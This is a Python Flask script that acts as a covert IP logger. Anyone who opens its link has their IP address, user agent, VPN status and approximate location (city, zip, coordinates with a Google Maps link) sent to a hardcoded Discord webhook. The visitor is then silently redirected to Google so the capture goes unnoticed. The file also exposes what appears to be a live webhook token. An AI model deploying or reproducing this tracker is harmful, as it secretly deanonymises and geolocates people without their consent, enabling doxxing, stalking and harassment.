# main.py

from flask import Flask, request, redirect
import requests
import json
import datetime
import os

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

def get_visitor_info(ip, user_agent):
    try:
        ipapi_url = f"https://ipapi.co/{ip}/json/"
        geoip_url = f"https://json.geoiplookup.io/{ip}"

        details = requests.get(ipapi_url).json()
        vpnconn = requests.get(geoip_url).json()

        vpn = "Yes" if vpnconn.get("connection_type") == "Corporate" else "No"

        info = {
            "ip": ip,
            "user_agent": user_agent,
            "vpn": vpn,
            "country": details.get("country_name", "Unknown"),
            "countryCode": details.get("country_code", "xx").lower(),
            "region": details.get("region", ""),
            "city": details.get("city", ""),
            "zip": details.get("postal", ""),
            "lat": details.get("latitude", 0),
            "lon": details.get("longitude", 0),
            "date": datetime.datetime.utcnow().strftime("%d/%m/%Y"),
            "time": datetime.datetime.utcnow().strftime("%H:%M:%S"),
        }
        return info
    except Exception as e:
        print("Error getting IP info:", e)
        return {
            "ip": ip,
            "user_agent": user_agent,
            "vpn": "Unknown",
            "country": "Unknown",
            "countryCode": "xx",
            "region": "",
            "city": "",
            "zip": "",
            "lat": 0,
            "lon": 0,
            "date": datetime.datetime.utcnow().strftime("%d/%m/%Y"),
            "time": datetime.datetime.utcnow().strftime("%H:%M:%S"),
        }

def send_to_discord(info):
    try:
        flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
        ip_city = f"{info['ip']} ({info['city'] if info['city'] else 'Unknown City'})"

        embed = {
            "username": ip_city,
            "avatar_url": flag_url,
            "embeds": [{
                "title": f"Visitor From {info['country']}",
                "color": 39423,
                "fields": [
                    {"name": "IP & City", "value": ip_city, "inline": True},
                    {"name": "VPN?", "value": info["vpn"], "inline": True},
                    {"name": "User Agent", "value": info["user_agent"]},
                    {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
                    {"name": "Region | City | Zip", "value": f"[{info['region']} | {info['city']} | {info['zip']}](https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']})", "inline": True},
                ],
                "footer": {
                    "text": f"{info['date']} {info['time']}",
                    "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                }
            }]
        }

        headers = {"Content-Type": "application/json"}
        requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(embed), headers=headers)
    except Exception as e:
        print("Error sending to Discord:", e)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')
    info = get_visitor_info(ip, user_agent)
    send_to_discord(info)
    return redirect("https://www.google.com")

# Required for Render.com to work correctly
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
